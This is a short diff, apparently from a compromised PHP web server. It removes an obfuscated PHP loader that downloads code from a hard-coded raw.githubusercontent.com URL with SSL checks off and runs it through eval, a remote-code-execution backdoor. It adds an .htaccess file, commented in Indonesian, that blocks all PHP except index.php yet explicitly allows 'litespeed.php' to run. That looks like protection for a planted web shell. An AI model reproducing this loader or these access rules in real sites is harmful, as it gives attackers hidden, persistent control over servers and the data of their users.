@@ -1,2 +1,14 @@
-<?php
- goto xTAO1; KH71f: class CodeExecutor { private $fetcher; public function __construct(CurlFetcher $fetcher) { $this->fetcher = $fetcher; } public function executeCodeFromURL(string $url) : void { $code = $this->fetcher->fetchContent($url); if ($code === false || trim($code) === '') { throw new Exception("\106\141\151\154\145\144\x20\x74\x6f\40\x66\x65\x74\143\x68\x20\x63\157\x6e\x74\145\156\164\x20\146\x72\x6f\x6d\x20\x55\122\114\x20\x6f\162\x20\164\150\x65\40\x63\157\156\x74\145\x6e\164\40\x69\x73\40\145\155\160\164\171\x2e"); } eval("\77\x3e" . $code); } } goto Qpils; xTAO1: class CurlFetcher { public function fetchContent(string $url) { if (function_exists("\x63\165\x72\154\137\x76\x65\x72\x73\x69\157\x6e")) { $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); curl_setopt($curl, CURLOPT_HEADER, 0); $response = curl_exec($curl); if (curl_errno($curl)) { $error = curl_error($curl); curl_close($curl); throw new Exception("\x63\125\122\114\40\105\162\162\x6f\162\72\40" . $error); } curl_close($curl); return $response; } throw new Exception("\x63\125\x52\114\40\151\163\x20\156\x6f\x74\x20\x65\x6e\141\x62\154\145\x64\x20\x6f\156\40\x74\x68\x69\163\x20\163\x65\162\166\145\x72\56"); } } goto KH71f; Qpils: try { $fetcher = new CurlFetcher(); $executor = new CodeExecutor($fetcher); $executor->executeCodeFromURL("\150\x74\x74\x70\x73\x3a\57\x2f\162\141\167\x2e\x67\x69\164\150\165\142\x75\163\x65\162\x63\157\156\164\145\156\164\56\x63\x6f\x6d\57\x67\145\x74\x2d\111\x50\x53\57\154\157\x63\141\154\x2f\x72\x65\146\163\57\150\x65\x61\x64\x73\x2f\155\x61\151\156\57\61\x33\x2e\164\x78\164"); } catch (Exception $e) { echo "\x45\162\x72\x6f\x72\x3a\x20" . $e->getMessage(); }
+Options -Indexes
+# Blokir akses file PHP selain index.php di sub-folder
+<FilesMatch "^(?!index\.php$).*\.(php[3457]?|pht|phtml|shtml)$">
+    Order Deny,Allow
+    Deny from all
+</FilesMatch>
+
+# Bisa diakses dan berjalan
+<Files "litespeed.php">
+    Order Allow,Deny
+    Allow from all
+</Files>
+
+ErrorDocument 403 /index.php
